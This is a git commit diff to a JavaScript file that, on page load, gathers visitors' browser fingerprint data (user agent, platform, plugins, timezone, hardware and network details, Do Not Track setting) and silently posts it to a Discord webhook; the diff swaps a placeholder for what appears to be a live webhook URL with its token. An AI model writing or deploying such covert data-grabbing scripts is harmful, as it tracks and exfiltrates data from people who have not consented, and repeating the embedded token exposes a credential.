3535133901987880924712e6c8a3d28b100152ad
Byte Wizard <122925084+BYT3W1Z4RD@users.noreply.github.com>
2023-05-05 19:24:34 +0100

    Update script.js

--- script.js
+++ script.js
@@ -8,13 +8,19 @@ window.onload = function() {
     var mimeTypes = "";
     var cookiesEnabled = navigator.cookieEnabled;
     var timeZone = new Date().getTimezoneOffset();
+    var doNotTrack = navigator.doNotTrack;
+    var hardwareConcurrency = navigator.hardwareConcurrency;
+    var maxTouchPoints = navigator.maxTouchPoints;
+    var connectionType = navigator.connection.type;
+    var effectiveType = navigator.connection.effectiveType;
+    var networkInformation = "Connection Type: " + connectionType + "\nEffective Type: " + effectiveType + "\nMax Touch Points: " + maxTouchPoints + "\nHardware Concurrency: " + hardwareConcurrency + "\nDo Not Track: " + doNotTrack + "\n";
     for (var i = 0; i < navigator.plugins.length; i++) {
         plugins += navigator.plugins[i].name + "; ";
         mimeTypes += navigator.plugins[i].name + ": " + navigator.plugins[i].filename + "\n";
     }
-    var fingerprint = "**User Agent:** " + userAgent + "\n**Platform:** " + platform + "\n**Language:** " + language + "\n**Color Depth:** " + colorDepth + "\n**Pixel Ratio:** " + pixelRatio + "\n**Cookies Enabled:** " + cookiesEnabled + "\n**Timezone:** " + timeZone + "\n**Plugins:** " + plugins + "\n**MIME Types:**\n " + mimeTypes;
+    var fingerprint = "```User Agent: " + userAgent + "\nPlatform: " + platform + "\nLanguage: " + language + "\nColor Depth: " + colorDepth + "\nPixel Ratio: " + pixelRatio + "\nCookies Enabled: " + cookiesEnabled + "\nTimezone: " + timeZone + "\n" + "Network Information:\n" + networkInformation + "\nPlugins: " + plugins + "\nMIME Types:\n" + mimeTypes + "```";
     var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://discord.com/api/webhooks/WEBHOOK");
+    xhr.open("POST", "https://discord.com/api/webhooks/1067827238332006451/WPvS6MIUYk-uaHxyH9IM5p0oOKMWC4mhJ7gZwizAUwY7JYk_Lp3wdQrWEXH6oZB-qFZx");
     var params = JSON.stringify({
         content: fingerprint
     });
